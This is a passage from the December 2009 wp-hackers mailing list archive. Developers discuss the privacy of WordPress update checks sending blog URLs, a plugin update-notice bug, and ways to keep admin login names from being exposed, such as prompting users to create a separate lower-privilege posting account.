> is
> > being collected and how it is being used, I would like to know if
> WordPress
> > has found any need to collect blog URL's?  If it has, then this should be
> > disclosed, if it has not then perhaps we should be replacing the blog URL
> > with an anonymous identifier.
>
> wordpress.org has a privacy policy that applies to any information
> sent to the site, which would include the API.
>
> http://wordpress.org/about/privacy/
>
> It's fairly standard. The meat:
>
> "WordPress.org will not rent or sell potentially
> personally-identifying and personally-identifying information"
>

That doesn't cover data that is sent from WordPress installs though Mark. It
only relates to people who visit wordpress.org.

My question relates to the sending of the blog URL in the
http_headers_useragent. I still cannot see any reason why this information
is being sent to WordPress or what use WordPress is making of it. Since Matt
indicated that its use would be revisited, and that was 2 years ago with
nothing happening since, I'd like to know if there are any plans to change
this for non-identifying data or if it even that is not needed.

The reason I'm asking now is that I have been fixing a site that was hacked.
The reason it was hacked was that the owner didn't know of an update that
would have protected his site. The reason he didn't know was because he was
using plugins to prevent update checks - and was only using those because he
didn't want to send his site URL to WordPress. (Ok, he would have known if
he had been keeping track of updates externally, but this is a case where
privacy concerns removed an important feature from WordPress and
disadvantaged him in the process).

A quick look at the plugins shows that people are still disabling these
update checks:
http://wordpress.org/extend/plugins/search.php?q=core+update+notification
How many are doing this just because they want to protect their privacy?

Lynne

From joost at yoast.com  Mon Dec  7 07:10:36 2009
From: joost at yoast.com (Joost de Valk)
Date: Mon, 7 Dec 2009 08:10:36 +0100
Subject: [wp-hackers] Plugin updates
In-Reply-To: <2979bd660912062228q337fd380qa1acdac463af59c8@mail.gmail.com>
References: <666eb9f0912061155h1418d356m853e679f35bb2dba@mail.gmail.com>
	<2979bd660912062228q337fd380qa1acdac463af59c8@mail.gmail.com>
Message-ID: <666eb9f0912062310m2a1881c9wc5fac2a079bafa78@mail.gmail.com>

That's because I've now changed that final file as well :)

3.2.5 was a fix for a possible XSS gap, so it was quite urgent :)

On Mon, Dec 7, 2009 at 7:28 AM, Mark Jaquith <markjaquith at gmail.com> wrote:

> On Sun, Dec 6, 2009 at 2:55 PM, Joost de Valk <joost at yoast.com> wrote:
> > if you downloaded the plugin, you got version 3.2.5. If you
> > were on 3.2.2 and upgraded, you got 3.2.5. However, if you were on 3.2.4,
> > you didn't get an update notice...
>
> I installed 3.2.4 and I was immediately given an upgrade notice for
> 3.2.5, which worked.
>
> That's running WP 2.9 /trunk/
>
> --
> Mark Jaquith
> ? http://markjaquith.com/
> ? http://coveredwebservices.com/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jaredbangs at gmail.com  Mon Dec  7 07:20:16 2009
From: jaredbangs at gmail.com (Jared Bangs)
Date: Sun, 6 Dec 2009 23:20:16 -0800
Subject: [wp-hackers] Plugin updates
In-Reply-To: <666eb9f0912061155h1418d356m853e679f35bb2dba@mail.gmail.com>
References: <666eb9f0912061155h1418d356m853e679f35bb2dba@mail.gmail.com>
Message-ID: <7b4922320912062320n76054e2j29bd8170902a8bd8@mail.gmail.com>

On 12/6/09, Joost de Valk <joost at yoast.com> wrote:
> I only missed one: the plugin file in that tags directory.

This question may or may not have anything to do with the issue you
experienced, but from that description it sounds like the tag was not
created via a svn copy. Just curious whether that was true, and if so
how did you do it (just manually adding the tag dir?) and why?

It's been my experience that the "best practice" re: tags is to always
create them as copies of the associated release branch (or trunk if
not using branches), and essentially treat them as "read-only"
snapshots of what was released at any given point in time or release
version. The svn copy command makes this easy to do and also takes
advantage of subversion then being aware of that relationship and not
needing to store extra files, etc.

Not looking to start some sort of argument here; just curious if other
people are doing things differently and interested to learn why, for
my own education.

Great plugin, BTW.

From markjaquith at gmail.com  Mon Dec  7 07:46:54 2009
From: markjaquith at gmail.com (Mark Jaquith)
Date: Mon, 7 Dec 2009 02:46:54 -0500
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <427667db0912062233l20b578b4u565a307c15c2d595@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com> 
	<2979bd660912062149v583780a2vcec94ec1b7c967c1@mail.gmail.com> 
	<427667db0912062233l20b578b4u565a307c15c2d595@mail.gmail.com>
Message-ID: <2979bd660912062346w49ed439dg357f98f06b43c2d7@mail.gmail.com>

On Mon, Dec 7, 2009 at 1:33 AM, Lynne Pope <lynne.pope at gmail.com> wrote:
> That doesn't cover data that is sent from WordPress installs though Mark. It
> only relates to people who visit wordpress.org.

It specifically mentions data sent from servers (my emphasis):

> Like most website operators, WordPress.org collects non-personally-identifying information of the sort that web browsers ***and servers*** typically make available

And it specifically mentions api.wordpress.org, which is what
WordPress installs contact (my emphasis):

> WordPress.org may collect statistics about the behavior of visitors to its websites. For instance, WordPress.org may reveal how many downloads a particular version got, or say which plugins are most popular based on checks from ***api.wordpress.org, a web service used by WordPress installations to check for new versions of WordPress and plugins***.

> My question relates to the sending of the blog URL in the
> http_headers_useragent. I still cannot see any reason why this information
> is being sent to WordPress or what use WordPress is making of it.

For one thing, it gives us a nice, standard, unique identifier for the
blog. That's what URLs were made for! Matt suggested some theoretical
anonymous uses that related to looking for patterns.

> Since Matt
> indicated that its use would be revisited, and that was 2 years ago with
> nothing happening since, I'd like to know if there are any plans to change
> this for non-identifying data or if it even that is not needed.

I haven't seen any continuing strenuous objections. I know I'm the one
that started that thread ? but my objections were largely addressed by
Matt's responses and the privacy policy. The privacy policy makes it
pretty clear what WordPress.org can and can't do with the data. So no,
I'm not aware of any plans to change this.

The more I thought about it, the more my knee-jerk objections faded
away. Your server is doing an HTTP request, so the server knows your
server's IP address. You can figure out what blog domains are hosted
on that IP with a search on Bing or several other search engines. So
if WordPress.org really wanted to know your URL, it could find it.
Again, that's just based on the IP address, which you HAVE to send for
HTTP to work. If your URL is discoverable, and your IP address has to
be sent, withholding the URL doesn't actually get you more privacy,
ultimately. A search on ip:207.162.215.165 on Bing reveals
lynnepope.net, for instance (and for the record, I got that IP by
Google searching your name. :-) )

> The reason I'm asking now is that I have been fixing a site that was hacked.
> The reason it was hacked was that the owner didn't know of an update that
> would have protected his site. The reason he didn't know was because he was
> using plugins to prevent update checks - and was only using those because he
> didn't want to send his site URL to WordPress. (Ok, he would have known if
> he had been keeping track of updates externally, but this is a case where
> privacy concerns removed an important feature from WordPress and
> disadvantaged him in the process).
>
> A quick look at the plugins shows that people are still disabling these
> update checks:
> http://wordpress.org/extend/plugins/search.php?q=core+update+notification
> How many are doing this just because they want to protect their privacy?

That sounds like a case of squashing a fly with a sledgehammer. If you
still feel strongly about not sending a URL, even after reading the
WordPress.org privacy policy and doing a few "ip:<server IP>" searches
on Bing, there are ways of doing that without completely eliminating
update checks. As a WordPress consultant, I would hope that you would
strongly advise your clients against eliminating update checks!

-- 
Mark Jaquith
? http://markjaquith.com/
? http://coveredwebservices.com/

From markjaquith at gmail.com  Mon Dec  7 07:53:14 2009
From: markjaquith at gmail.com (Mark Jaquith)
Date: Mon, 7 Dec 2009 02:53:14 -0500
Subject: [wp-hackers] Plugin updates
In-Reply-To: <666eb9f0912061155h1418d356m853e679f35bb2dba@mail.gmail.com>
References: <666eb9f0912061155h1418d356m853e679f35bb2dba@mail.gmail.com>
Message-ID: <2979bd660912062353v2d7a643av9737546c1f377dbc@mail.gmail.com>

On Sun, Dec 6, 2009 at 2:55 PM, Joost de Valk <joost at yoast.com> wrote:
> I only missed one: the plugin file in that tags directory. Now a very weird
> thing happened: if you downloaded the plugin, you got version 3.2.5. If you
> were on 3.2.2 and upgraded, you got 3.2.5. However, if you were on 3.2.4,
> you didn't get an update notice...
>
> That sounds like a bug, doesn't it?

Ah, I misread this. It might be peeking at the version in the plugin
file, instead of relying on the tag name. It should be handled
consistently, not offering you two different versions based on what
version you're currently running, no matter what mistakes you make in
the plugin file's meta version.

I'm pinging Mike Adams to take a look at this.

-- 
Mark Jaquith
? http://markjaquith.com/
? http://coveredwebservices.com/

From joost at yoast.com  Mon Dec  7 07:58:57 2009
From: joost at yoast.com (Joost de Valk)
Date: Mon, 7 Dec 2009 08:58:57 +0100
Subject: [wp-hackers] Plugin updates
In-Reply-To: <2979bd660912062353v2d7a643av9737546c1f377dbc@mail.gmail.com>
References: <666eb9f0912061155h1418d356m853e679f35bb2dba@mail.gmail.com>
	<2979bd660912062353v2d7a643av9737546c1f377dbc@mail.gmail.com>
Message-ID: <666eb9f0912062358j63b1c661y4c6a7bc3f92e4e41@mail.gmail.com>

On Mon, Dec 7, 2009 at 8:53 AM, Mark Jaquith <markjaquith at gmail.com> wrote:

> On Sun, Dec 6, 2009 at 2:55 PM, Joost de Valk <joost at yoast.com> wrote:
> > I only missed one: the plugin file in that tags directory. Now a very
> weird
> > thing happened: if you downloaded the plugin, you got version 3.2.5. If
> you
> > were on 3.2.2 and upgraded, you got 3.2.5. However, if you were on 3.2.4,
> > you didn't get an update notice...
> >
> > That sounds like a bug, doesn't it?
>
> Ah, I misread this. It might be peeking at the version in the plugin
> file, instead of relying on the tag name. It should be handled
> consistently, not offering you two different versions based on what
> version you're currently running, no matter what mistakes you make in
> the plugin file's meta version.
>
> That's what I thought, thanks for taking action!

From joost at yoast.com  Mon Dec  7 08:00:12 2009
From: joost at yoast.com (Joost de Valk)
Date: Mon, 7 Dec 2009 09:00:12 +0100
Subject: [wp-hackers] Plugin updates
In-Reply-To: <7b4922320912062320n76054e2j29bd8170902a8bd8@mail.gmail.com>
References: <666eb9f0912061155h1418d356m853e679f35bb2dba@mail.gmail.com>
	<7b4922320912062320n76054e2j29bd8170902a8bd8@mail.gmail.com>
Message-ID: <666eb9f0912070000y2d45e43bvcf6788d2a60003c@mail.gmail.com>

On Mon, Dec 7, 2009 at 8:20 AM, Jared Bangs <jaredbangs at gmail.com> wrote:

> On 12/6/09, Joost de Valk <joost at yoast.com> wrote:
> > I only missed one: the plugin file in that tags directory.
>
> This question may or may not have anything to do with the issue you
> experienced, but from that description it sounds like the tag was not
> created via a svn copy. Just curious whether that was true, and if so
> how did you do it (just manually adding the tag dir?) and why?
>
> It's been my experience that the "best practice" re: tags is to always
> create them as copies of the associated release branch (or trunk if
> not using branches), and essentially treat them as "read-only"
> snapshots of what was released at any given point in time or release
> version. The svn copy command makes this easy to do and also takes
> advantage of subversion then being aware of that relationship and not
> needing to store extra files, etc.
>
> Not looking to start some sort of argument here; just curious if other
> people are doing things differently and interested to learn why, for
> my own education.
>
> Great plugin, BTW.
>

I normally do make them through svn copy, and did so here too, but forgot to
change the version number in that file before making the copy, apparently ;)

Cheers
Joost

From markjaquith at gmail.com  Mon Dec  7 08:04:44 2009
From: markjaquith at gmail.com (Mark Jaquith)
Date: Mon, 7 Dec 2009 03:04:44 -0500
Subject: [wp-hackers] Possible security patch
In-Reply-To: <a8405fa30912050738n112bba69s944171c92b9669cf@mail.gmail.com>
References: <a8405fa30912050738n112bba69s944171c92b9669cf@mail.gmail.com>
Message-ID: <2979bd660912070004w7edec9cbw3a76d48a30464da0@mail.gmail.com>

On Sat, Dec 5, 2009 at 10:38 AM, Ian Stewart <ian at themeshaper.com> wrote:
> Just wondered if I could get your opinion on a possible security patch I
> might try and write. I know WordPress is no fan of security through
> obscurity but as it stands right now, if you're publishing posts as the
> admin user, your login name can be harvested from the body_class and author
> URLs. Would there be any interest in seeing it patched to a sanitized
> display_name or nickname? I can't imagine how many WordPress sites are live
> with super-weak passwords and the admin login name just hanging out there.

You shouldn't be posting as the admin user. Make an Editor level
account for your posting. Limit your potential exposure in the event
of a password disclosure or brute-forcing.

There are many ways in which we disclose or hint at user names:

(1) The login form tells you when a password is wrong, as opposed to a
user name being wrong.
(2) Classes
(3) Author URLs

The login form thing is tremendously helpful to users. Raise your hand
if you've ever gotten a message like "that user/pass combo is invalid"
and had NO IDEA whether it was the user or the password that was
incorrect? I do that on a weekly basis.

The author URLs are user-friendly. How are you going to decouple that
from the login name without changing the user name or making the
author URLs less clean and less friendly? I don't think you can.
/author/mark-52300234/ ? Yuck.

I think I have a better method of tackling this issue: We now prompt
the user in the wp-admin when they are using the default install
password or a reset password. What about if we do a similar prompt if
"admin" is the only user on the blog, suggesting that they create a
second user name and use THAT for posting?

-- 
Mark Jaquith
? http://markjaquith.com/
? http://coveredwebservices.com/

From lynne.pope at gmail.com  Mon Dec  7 08:36:26 2009
From: lynne.pope at gmail.com (Lynne Pope)
Date: Mon, 7 Dec 2009 21:36:26 +1300
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <2979bd660912062346w49ed439dg357f98f06b43c2d7@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com> 
	<2979bd660912062149v583780a2vcec94ec1b7c967c1@mail.gmail.com> 
	<427667db0912062233l20b578b4u565a307c15c2d595@mail.gmail.com> 
	<2979bd660912062346w49ed439dg357f98f06b43c2d7@mail.gmail.com>
Message-ID: <427667db0912070036o76a5d337jfa89d0863e3f22a1@mail.gmail.com>

2009/12/7 Mark Jaquith <markjaquith at gmail.com>

> On Mon, Dec 7, 2009 at 1:33 AM, Lynne Pope <lynne.pope at gmail.com> wrote:
> > That doesn't cover data that is sent from WordPress installs though Mark.
> It
> > only relates to people who visit wordpress.org.
>
> It specifically mentions data sent from servers (my emphasis):
>
> > Like most website operators, WordPress.org collects
> non-personally-identifying information of the sort that web browsers ***and
> servers*** typically make available
>

This does not cover data collected from software. If any reasonable person
read that statement they would infer that it relates to visiting
wordpress.org and what information may be disclosed on wordpress.org, but
not what information is collected when they install the WordPress
application.


> And it specifically mentions api.wordpress.org, which is what
> WordPress installs contact (my emphasis):
>
> > WordPress.org may collect statistics about the behavior of visitors to
> its websites. For instance, WordPress.org may reveal how many downloads a
> particular version got, or say which plugins are most popular based on
> checks from ***api.wordpress.org, a web service used by WordPress
> installations to check for new versions of WordPress and plugins***.
>

"from its websites" - no mention of what is collected from other people's
websites without their explicit permission.


>
> > My question relates to the sending of the blog URL in the
> > http_headers_useragent. I still cannot see any reason why this
> information
> > is being sent to WordPress or what use WordPress is making of it.
>
> For one thing, it gives us a nice, standard, unique identifier for the
> blog. That's what URLs were made for! Matt suggested some theoretical
> anonymous uses that related to looking for patterns.
>

This is also not anonymous and no opt-in, consent or otherwise is available.
There are other ways of submitting unique identifiers without compromising
privacy.


>
> > Since Matt
> > indicated that its use would be revisited, and that was 2 years ago with
> > nothing happening since, I'd like to know if there are any plans to
> change
> > this for non-identifying data or if it even that is not needed.
>
> I haven't seen any continuing strenuous objections. I know I'm the one
> that started that thread ? but my objections were largely addressed by
> Matt's responses and the privacy policy. The privacy policy makes it
> pretty clear what WordPress.org can and can't do with the data. So no,
> I'm not aware of any plans to change this.
>

Sure, there was a knee-jerk reaction back in 2007 but given the responses at
that time (specifically, "if you don't like it, fork") its not surprising
that people just shut up and either went their own way or hacked the core.
The question still remains - why does WordPress need to use an identifying
blog URL and why is it such a big deal to change this?


> The more I thought about it, the more my knee-jerk objections faded
> away. Your server is doing an HTTP request, so the server knows your
> server's IP address. You can figure out what blog domains are hosted
> on that IP with a search on Bing or several other search engines. So
> if WordPress.org really wanted to know your URL, it could find it.
>

Irrelevant. A lot of information is discoverable if anyone wants to search
for it. If WordPress wanted to run whois and IP lookups that is up to
WordPress. People should not be mandated to hand over personal information
without knowledge that they are doing so and without the option to opt-in to
this.


> > The reason I'm asking now is that I have been fixing a site that was
> hacked.
> > The reason it was hacked was that the owner didn't know of an update that
> > would have protected his site. The reason he didn't know was because he
> was
> > using plugins to prevent update checks - and was only using those because
> he
> > didn't want to send his site URL to WordPress. (Ok, he would have known
> if
> > he had been keeping track of updates externally, but this is a case where
> > privacy concerns removed an important feature from WordPress and
> > disadvantaged him in the process).
> >
> > A quick look at the plugins shows that people are still disabling these
> > update checks:
> >
> http://wordpress.org/extend/plugins/search.php?q=core+update+notification
> > How many are doing this just because they want to protect their privacy?
>
> That sounds like a case of squashing a fly with a sledgehammer. If you
> still feel strongly about not sending a URL, even after reading the
> WordPress.org privacy policy and doing a few "ip:<server IP>" searches
> on Bing, there are ways of doing that without completely eliminating
> update checks. As a WordPress consultant, I would hope that you would
> strongly advise your clients against eliminating update checks!
>

What I would advise has no bearing on what people are actually doing. The
plugins are available and people are using them. While I see the update
checks as invaluable, not everyone knows how to anonymise these.

It seems such a trivial change to make - why not just a "send stats to
wordpress.org y/n" to switch the blog URL on or off?
At the moment, I'm just at a loss as to how to respond to the questions I am
getting about this, especially when I agree with people who don't like this
aspect of WordPress.

Lynne

From harish.mlists at gmail.com  Mon Dec  7 08:50:30 2009
From: harish.mlists at gmail.com (Harish Narayanan)
Date: Mon, 07 Dec 2009 08:50:30 +0000
Subject: [wp-hackers] Possible security patch
In-Reply-To: <2979bd660912070004w7edec9cbw3a76d48a30464da0@mail.gmail.com>
References: <a8405fa30912050738n112bba69s944171c92b9669cf@mail.gmail.com>
	<2979bd660912070004w7edec9cbw3a76d48a30464da0@mail.gmail.com>
Message-ID: <4B1CC1D6.2040709@gmail.com>

Mark Jaquith wrote:
> 
> I think I have a better method of tackling this issue: We now prompt
> the user in the wp-admin when they are using the default install
> password or a reset password. What about if we do a similar prompt if
> "admin" is the only user on the blog, suggesting that they create a
> second user name and use THAT for posting?

And this second user wouldn't just be an admin-level user under a
different name; it would be a user with reduced privileges capable of
only basic day-to-day interactions with the admin interface of the blog?
(As has come up earlier in this thread.)

If so, I think this is a great idea. (Extrapolating from operating
system installs that do this all the time, dramatically improving their
security situation.)

Harish

From ozh at planetozh.com  Mon Dec  7 08:57:42 2009
From: ozh at planetozh.com (Ozh)
Date: Mon, 7 Dec 2009 09:57:42 +0100
Subject: [wp-hackers] Possible security patch
In-Reply-To: <4B1CC1D6.2040709@gmail.com>
Message-ID: <OFADEDD825.6AEFE84B-ONC1257685.0030CD40-C1257685.003139F7@notes.edfgdf.fr>

Mark Jaquith wrote:
> I think I have a better method of tackling this issue: We now prompt
> the user in the wp-admin when they are using the default install
> password or a reset password. What about if we do a similar prompt if
> "admin" is the only user on the blog, suggesting that they create a
> second user name and use THAT for posting?

What about simply asking the user about renaming 'admin' to something more 
personal?

Ozh

From burobjorn at gmail.com  Mon Dec  7 11:34:46 2009
From: burobjorn at gmail.com (Bjorn Wijers)
Date: Mon, 07 Dec 2009 12:34:46 +0100
Subject: [wp-hackers] Is it possible to filter 'View post' or 'Preview' url
 in wp-admin
Message-ID: <4B1CE856.2060603@gmail.com>

Hi,

I'm grepping through the wp-admin source files and I can't seem to find
the filter or action I need. I would like to be able to change the 'View
Post' and 'Preview' post links depending on the just saved post's
category, so that I can make sure the user sees the post with the right
template and context. Is this possible?

Any help much appreciated.

All the best,

grtz
BjornW

-- 

met vriendelijke groet,
Bjorn Wijers

* b u r o b j o r n .nl *
digitaal vakmanschap | digital craftsmanship

Concordiastraat 68-126
3551 EM Utrecht
The Netherlands

phone: +31 6 49 74 78 70
http://www.burobjorn.nl

From ozh at planetozh.com  Mon Dec  7 12:55:40 2009
From: ozh at planetozh.com (Ozh)
Date: Mon, 7 Dec 2009 13:55:40 +0100
Subject: [wp-hackers] Is it possible to filter 'View post' or 'Preview'
 url in wp-admin
In-Reply-To: <4B1CE856.2060603@gmail.com>
Message-ID: <OF0A4B2609.16498CAA-ONC1257685.0046D450-C1257685.0047038F@notes.edfgdf.fr>

> I'm grepping through the wp-admin source files and I can't seem to find
> the filter or action I need. I would like to be able to change the 'View
> Post' and 'Preview' post links depending on the just saved post's
> category, so that I can make sure the user sees the post with the right
> template and context. Is this possible?

If you want to modify the text, adding a filter on 'gettext' will probably 
do
See translate() in wp-includes/l10n.php

Ozh

From ian at themeshaper.com  Mon Dec  7 13:20:41 2009
From: ian at themeshaper.com (Ian Stewart)
Date: Mon, 7 Dec 2009 07:20:41 -0600
Subject: [wp-hackers] Possible security patch
In-Reply-To: <OFADEDD825.6AEFE84B-ONC1257685.0030CD40-C1257685.003139F7@notes.edfgdf.fr>
References: <4B1CC1D6.2040709@gmail.com>
	<OFADEDD825.6AEFE84B-ONC1257685.0030CD40-C1257685.003139F7@notes.edfgdf.fr>
Message-ID: <a8405fa30912070520y4884ed74vc3cbe929bda3ac87@mail.gmail.com>

I'm for prompting the user to start another account AND no longer suggesting
admin be the user name.

On Mon, Dec 7, 2009 at 2:57 AM, Ozh <ozh at planetozh.com> wrote:

> Mark Jaquith wrote:
> > I think I have a better method of tackling this issue: We now prompt
> > the user in the wp-admin when they are using the default install
> > password or a reset password. What about if we do a similar prompt if
> > "admin" is the only user on the blog, suggesting that they create a
> > second user name and use THAT for posting?
>
> What about simply asking the user about renaming 'admin' to something more
> personal?
>
> Ozh
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Ian Stewart

http://ThemeShaper.com/
http://twitter.com/iandstewart/
http://ianstewart.stumbleupon.com/

From lynne.pope at gmail.com  Mon Dec  7 13:32:47 2009
From: lynne.pope at gmail.com (Lynne Pope)
Date: Tue, 8 Dec 2009 02:32:47 +1300
Subject: [wp-hackers] Possible security patch
In-Reply-To: <a8405fa30912070520y4884ed74vc3cbe929bda3ac87@mail.gmail.com>
References: <4B1CC1D6.2040709@gmail.com>
	<OFADEDD825.6AEFE84B-ONC1257685.0030CD40-C1257685.003139F7@notes.edfgdf.fr>
	<a8405fa30912070520y4884ed74vc3cbe929bda3ac87@mail.gmail.com>
Message-ID: <427667db0912070532v779bd94bi28c8285c86be319@mail.gmail.com>

2009/12/8 Ian Stewart <ian at themeshaper.com>

> I'm for prompting the user to start another account AND no longer
> suggesting
> admin be the user name.
>
> On Mon, Dec 7, 2009 at 2:57 AM, Ozh <ozh at planetozh.com> wrote:
>
> > Mark Jaquith wrote:
> > > I think I have a better method of tackling this issue: We now prompt
> > > the user in the wp-admin when they are using the default install
> > > password or a reset password. What about if we do a similar prompt if
> > > "admin" is the only user on the blog, suggesting that they create a
> > > second user name and use THAT for posting?
> >
> > What about simply asking the user about renaming 'admin' to something
> more
> > personal?
>

Agree with Ian here. Prompting to rename "admin" AND create another account
for posting, recommending they use the Editor role for that second account.

If there is going to be a prompt it really needs to spell things out,
otherwise we'll see people creating a second user name ok, with admin
privileges.

Lynne

From peter.westwood at ftwr.co.uk  Mon Dec  7 13:56:20 2009
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Mon, 7 Dec 2009 08:56:20 -0500
Subject: [wp-hackers] Possible security patch
In-Reply-To: <427667db0912070532v779bd94bi28c8285c86be319@mail.gmail.com>
References: <4B1CC1D6.2040709@gmail.com>
	<OFADEDD825.6AEFE84B-ONC1257685.0030CD40-C1257685.003139F7@notes.edfgdf.fr>
	<a8405fa30912070520y4884ed74vc3cbe929bda3ac87@mail.gmail.com>
	<427667db0912070532v779bd94bi28c8285c86be319@mail.gmail.com>
Message-ID: <01BD8BD4-1800-4107-B6F6-9E9B16D9BF77@ftwr.co.uk>


On 7 Dec 2009, at 08:32, Lynne Pope wrote:
>
> Agree with Ian here. Prompting to rename "admin" AND create another  
> account
> for posting, recommending they use the Editor role for that second  
> account.
>
> If there is going to be a prompt it really needs to spell things out,
> otherwise we'll see people creating a second user name ok, with admin
> privileges.
>

I'm not sure I understand the security benefit of renaming the admin  
account.

You don't go round renaming the root account on a UNIX install to  
improve security - you lock the account down with a secure password  
and use it appropriately working as a normal user as much as possible

The process of creating an account for posting could be part of a post- 
install guided process - maybe if you go to the Add New post screen  
you get a message about creating a user to write posts with seperate  
from the admin user with a way to dismiss this message.

I think we need to careful explore the best user experience on this  
before we rush in and do something - maybe we need to work through a  
couple of different wireframes on this.

Peter
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From if.website at gmail.com  Mon Dec  7 14:06:31 2009
From: if.website at gmail.com (Austin Matzko)
Date: Mon, 7 Dec 2009 08:06:31 -0600
Subject: [wp-hackers] Possible security patch
In-Reply-To: <01BD8BD4-1800-4107-B6F6-9E9B16D9BF77@ftwr.co.uk>
References: <4B1CC1D6.2040709@gmail.com>
	<OFADEDD825.6AEFE84B-ONC1257685.0030CD40-C1257685.003139F7@notes.edfgdf.fr>
	<a8405fa30912070520y4884ed74vc3cbe929bda3ac87@mail.gmail.com>
	<427667db0912070532v779bd94bi28c8285c86be319@mail.gmail.com>
	<01BD8BD4-1800-4107-B6F6-9E9B16D9BF77@ftwr.co.uk>
Message-ID: <674b4a3b0912070606s23aa1545s4ef6fb9124524100@mail.gmail.com>

On Mon, Dec 7, 2009 at 7:56 AM, Peter Westwood
<peter.westwood at ftwr.co.uk> wrote:
> You don't go round renaming the root account on a UNIX install to improve
> security - you lock the account down with a secure password and use it
> appropriately working as a normal user as much as possible

Actually, it's considered good security practice to disable root SSH
logins.  My servers' logs are filled with automated attempts from
around the world to login with "root"; it's seemingly non-stop, but
none of those bots are trying the user I actually use to administrate
with.  Denying root logins significantly reduces the (already
unlikely) possibility that one of the bots will succeed in guessing
the necessary credentials.

From bradw at illiams.com  Mon Dec  7 14:10:55 2009
From: bradw at illiams.com (Brad Williams)
Date: Mon, 7 Dec 2009 09:10:55 -0500
Subject: [wp-hackers] Possible security patch
In-Reply-To: <01BD8BD4-1800-4107-B6F6-9E9B16D9BF77@ftwr.co.uk>
References: <4B1CC1D6.2040709@gmail.com>	<OFADEDD825.6AEFE84B-ONC1257685.0030CD40-C1257685.003139F7@notes.edfgdf.fr>	<a8405fa30912070520y4884ed74vc3cbe929bda3ac87@mail.gmail.com>	<427667db0912070532v779bd94bi28c8285c86be319@mail.gmail.com>
	<01BD8BD4-1800-4107-B6F6-9E9B16D9BF77@ftwr.co.uk>
Message-ID: <006901ca7747$1807d3f0$48177bd0$@com>

I'm all in favor for something like this ticket/patch:
http://core.trac.wordpress.org/ticket/10396

Allowing the user to change the admin username during the installation
process.  

-Brad
@williamsba

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Peter Westwood
Sent: Monday, December 07, 2009 8:56 AM
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Possible security patch


On 7 Dec 2009, at 08:32, Lynne Pope wrote:
>
> Agree with Ian here. Prompting to rename "admin" AND create another  
> account
> for posting, recommending they use the Editor role for that second  
> account.
>
> If there is going to be a prompt it really needs to spell things out,
> otherwise we'll see people creating a second user name ok, with admin
> privileges.
>

I'm not sure I understand the security benefit of renaming the admin  
account.

You don't go round renaming the root account on a UNIX install to  
improve security - you lock the account down with a secure password  
and use it appropriately working as a normal user as much as possible

The process of creating an account for posting could be part of a post- 
install guided process - maybe if you go to the Add New post screen  
you get a message about creating a user to write posts with seperate  
from the admin user with a way to dismiss this message.

I think we need to careful explore the best user experience on this  
before we rush in and do something - maybe we need to work through a  
couple of different wireframes on this.

Peter
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5

_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers



From ncrice at gmail.com  Mon Dec  7 14:11:22 2009
From: ncrice at gmail.com (Nathan Rice)
Date: Mon, 7 Dec 2009 09:11:22 -0500
Subject: [wp-hackers] Possible security patch
In-Reply-To: <01BD8BD4-1800-4107-B6F6-9E9B16D9BF77@ftwr.co.uk>
References: <4B1CC1D6.2040709@gmail.com>
	<OFADEDD825.6AEFE84B-ONC1257685.0030CD40-C1257685.003139F7@notes.edfgdf.fr>
	<a8405fa30912070520y4884ed74vc3cbe929bda3ac87@mail.gmail.com>
	<427667db0912070532v779bd94bi28c8285c86be319@mail.gmail.com>
	<01BD8BD4-1800-4107-B6F6-9E9B16D9BF77@ftwr.co.uk>
Message-ID: <862d087f0912070611h2eb700erf72ac3b2076165aa@mail.gmail.com>

If the suggestion is to leave the admin account intact (and hardened with a
strong PW), but create a separate account with decreased privileges for
posting, then might I suggest letting both accounts have the same email
address? It's really frustrating to have to figure out an alternate email
account to use with one or the other WP accounts.

I still don' think this method properly accounts for a username being
clearly visible from all over the place. Letting users control what gets
used seems like a decent way of making brute-force attacks just a little bit
harder for bots to crack.

------------------
Nathan Rice
WordPress and Web Development
www.nathanrice.net | twitter.com/nathanrice


On Mon, Dec 7, 2009 at 8:56 AM, Peter Westwood <peter.westwood at ftwr.co.uk>wrote:

>
> On 7 Dec 2009, at 08:32, Lynne Pope wrote:
>
>>
>> Agree with Ian here. Prompting to rename "admin" AND create another
>> account
>> for posting, recommending they use the Editor role for that second
>> account.
>>
>> If there is going to be a prompt it really needs to spell things out,
>> otherwise we'll see people creating a second user name ok, with admin
>> privileges.
>>
>>
> I'm not sure I understand the security benefit of renaming the admin
> account.
>
> You don't go round renaming the root account on a UNIX install to improve
> security - you lock the account down with a secure password and use it
> appropriately working as a normal user as much as possible
>
> The process of creating an account for posting could be part of a
> post-install guided process - maybe if you go to the Add New post screen you
> get a message about creating a user to write posts with seperate from the
> admin user with a way to dismiss this message.
>
> I think we need to careful explore the best user experience on this before
> we rush in and do something - maybe we need to work through a couple of
> different wireframes on this.
>
> Peter
> --
> Peter Westwood
> http://blog.ftwr.co.uk | http://westi.wordpress.com
> C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From kikizas at gmail.com  Mon Dec  7 14:32:55 2009
From: kikizas at gmail.com (Demetris)
Date: Mon, 7 Dec 2009 16:32:55 +0200
Subject: [wp-hackers] Possible security patch
In-Reply-To: <862d087f0912070611h2eb700erf72ac3b2076165aa@mail.gmail.com>
References: <4B1CC1D6.2040709@gmail.com>
